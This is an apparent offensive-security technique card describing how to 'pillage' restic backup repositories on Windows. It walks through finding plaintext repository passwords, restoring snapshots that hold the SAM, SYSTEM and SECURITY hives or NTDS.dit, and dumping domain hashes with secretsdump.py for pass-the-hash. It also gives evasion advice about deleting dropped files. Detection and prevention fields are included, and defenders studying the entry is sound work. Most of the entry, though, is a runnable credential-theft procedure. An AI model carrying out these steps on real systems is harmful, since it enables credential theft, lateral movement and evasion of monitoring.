examples.label: Restore the snapshot with the hives

notes:
=== Restic Backup Restore — Recovering Files from Backup Repository ===
Use restic to browse and restore files from existing backup repositories.

=== WHAT RESTIC IS ===
Restic: open-source backup tool with encryption
Backup data stored in repositories (local, S3, SFTP, etc.)
Repositories require a password for access — find the password or key file

=== RECONNAISSANCE ===
Find restic installations and configs:
  wmic product get name | findstr -i restic
  Get-ChildItem -Path C:\ -Recurse -Include *.restic,*.json -ErrorAction SilentlyContinue | Where-Object {$_.Name -like "*restic*"}
  Look for environment variables: $env:RESTIC_PASSWORD, $env:RESTIC_REPOSITORY

Find repository password:
  Scheduled task scripts or automation scripts often contain plaintext repo passwords
  Check PowerShell history for restic commands with -p flag or RESTIC_PASSWORD exports

=== ATTACK FLOW ===
With known password and repository path:

List snapshots:
  $env:RESTIC_PASSWORD = "found_password"
  restic -r <repo_path> snapshots

Browse specific snapshot:
  restic -r <repo_path> ls <snapshot_id>

Restore specific snapshot (entire snapshot):
  restic -r <repo_path> restore <snapshot_id> --target C:\restored

Restore specific file/directory:
  restic -r <repo_path> restore <snapshot_id> --target C:\restored --include C:\Windows\System32\config

=== HIGH-VALUE RESTORE TARGETS ===
C:\Windows\System32\config (SAM + SYSTEM hives) → offline hash extraction
C:\Windows\NTDS\ (NTDS.dit) → if DC was backed up → all domain hashes
Web application directories → source code with embedded credentials
Database backup files → application data

=== CHAINING CONTEXT ===
Restic restore of DC backup → NTDS.dit + SYSTEM hive → secretsdump → all domain hashes
Restic restore of web app → web.config with DB credentials → lateral movement
Restic on standalone backup server → has copies of data from all backed-up systems
Backup repositories on network shares = single point with copies of data from all managed hosts

recommended.note: Alternative offline route to the hives.

name: Pillaging - restic Backup Restore
description: With a found restic repo password, list snapshots and restore one containing C:\Windows\System32\config to recover SAM/SYSTEM/SECURITY hives, then extract the Administrator hash offline for pass-the-hash.

defense.why_it_works: Restic is a backup tool that stores encrypted snapshots. If an attacker obtains the restic repository password, they can list and restore any snapshot, including those containing SYSTEM-protected files like SAM, SYSTEM, and SECURITY hives (backed up while they were locked via VSS). The restore operation retrieves a full copy of these files, enabling offline credential dumping.
defense.prerequisites: Knowledge of the restic repository password (found in config file, script, or environment variable). Network or filesystem access to the restic repository. secretsdump.py for offline processing.
defense.impact: Extraction of all Windows account hashes from a backup of protected registry hives, bypassing all runtime protections. Equivalent impact to direct NTDS.dit extraction if DC backups are included.
defense.detection: restic.exe process execution by non-backup user. Restic repository access from unexpected host. Large data restore operation. Registry hive files appearing in unexpected restore directories.
defense.artifacts: Process: restic.exe restore executed by non-admin | Network: restic repository accessed from non-backup host | File: SAM/SYSTEM/SECURITY restored to staging directory
defense.prevention: Store restic repository passwords in secrets managers — not in plaintext files or environment variables accessible to users. Restrict restic repository access to the backup service account only. Audit restic execution. Encrypt restic repositories with keys stored in HSM.
defense.misconfiguration: Restic repository password stored in plaintext config file or script in world-readable location. Repository accessible over a network share with broad access. Backup service account credentials known to multiple users.
defense.vulnerable_config:
# Attacker finds restic password in config:
type C:\ProgramData\backup\restic.conf
# RESTIC_PASSWORD=Sup3rS3cur3Backup!

# Restore SAM/SYSTEM from backup:
restic.exe -r \\backup-server\repo --password-file .\pass.txt snapshots
restic.exe -r \\backup-server\repo --password-file .\pass.txt restore latest --target .\restore_out
secretsdump.py -sam restore_out\SAM -system restore_out\SYSTEM LOCAL
defense.secure_config:
# Store restic password in secrets manager (not plaintext)
# Use Windows Credential Manager for restic password:
cmdkey /add:restic-repo /user:svc_backup /pass:<secure_password>

# Restrict repository access:
# Firewall: only backup server IP can access \\backup-server\repo
# Share ACL: only svc_backup has access

# Monitor restic execution:
# Alert: restic.exe run by non-svc_backup account
defense.evasion: Collect only the files you need and pull them over an existing channel; avoid staging large toolsets on the host; delete anything you drop.
